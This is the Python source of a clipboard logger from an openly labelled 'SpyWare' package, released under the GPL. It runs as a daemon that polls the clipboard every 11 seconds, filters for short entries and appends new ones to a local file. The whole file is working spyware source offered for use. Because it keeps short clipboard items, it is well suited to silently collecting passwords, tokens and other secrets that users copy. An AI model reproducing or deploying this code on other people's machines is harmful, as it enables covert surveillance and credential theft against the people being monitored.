#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a SpyWare to capture the clipboard.
#    Copyright (C) 2021, 2022, 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a SpyWare to capture the clipboard.

~# python3 ClipboardLogger.py clipboardSpy.conf

>>> from os import environ
>>> environ['clipboardSpy.conf'] = 'clipboardSpy.conf'
>>> from SpyWare.ClipboardLogger import clipboardSpy
>>> clipboardSpy()                    # (using env) OR
>>> clipboardSpy('clipboardSpy.conf') # (using config file name) OR
>>> clipboardSpy(argv=["ClipboardLogger.py", "clipboardSpy.conf"]) # (using argv)
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a SpyWare to capture the clipboard.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Daemon", "main", "config_load"]

from os.path import join, exists, dirname
from configparser import ConfigParser
from pyperclip import paste
from sys import argv, exit
from typing import List
from os import environ
from time import sleep


class CONFIGURATIONS:

    """
    This class contains configurations.
    """

    save_filename: str = "clipboard.txt"
    internval: float = 11


def config_load(filename: str = None, argv: List[str] = argv) -> int:

    """
    This function loads the configuration using a the configuration file.
    """

    CONFIG = ConfigParser()

    default_file_name = "clipboardSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        return 1

    CONFIG = CONFIG.__dict__["_sections"]
    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
        "filename", "clipboard.txt"
    )
    CONFIGURATIONS.internval = float(
        CONFIG.get("TIME", {}).get("internval", "11")
    )
    return 0


class Daemon:

    """
    This class implements a loop to get clipboard for ever.
    """

    def __init__(self):
        self.internval = CONFIGURATIONS.internval
        path = self.path = CONFIGURATIONS.save_filename
        create_if_not_exists(path)
        self.data_file = open(path)
        self.data = ""
        self.run = True

    def run_for_ever(self) -> None:

        """
        This function implements a loop to get clipboard for ever.
        """

        persistent_save = self.persistent_save
        internval = self.internval
        save = self.save
        counter = 0

        while self.run:
            clipboard = paste()
            counter += 1

            if len(clipboard) > 75:
                clipboard = ""
            else:
                save(clipboard)

            if counter >= 150:
                persistent_save()
                counter = 0

            if self.run:
                sleep(internval)

    def save(self, clipboard: str) -> None:

        """
        This function saves clipboard if isn't save before.
        """

        clipboard = f"{repr(clipboard)}\n"
        data_file = self.data_file
        data_file.seek(0)
        readline = data_file.readline

        data = readline()

        if clipboard in self.data:
            return None

        while data:
            if clipboard == data:
                return None
            data = readline()

        self.data += clipboard

    def persistent_save(self) -> None:

        """
        This function saves data in file.
        """

        path = self.path
        self.data_file.close()

        with open(path, "a") as file:
            file.write(self.data)

        self.data = ""
        self.data_file = open(path)


def create_if_not_exists(filename: str) -> None:

    """
    This function creates file if not exists.
    """

    if not exists(filename):
        file = open(filename, "w")
        file.write("")
        file.close()


def main(config_filename: str = None, argv: List[str] = argv) -> int:

    """
    This function starts the clipboard logger.
    """

    config_load(filename=config_filename, argv=argv)

    daemon = Daemon()
    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

    return 0


if __name__ == "__main__":
    print(copyright)
    exit(main())
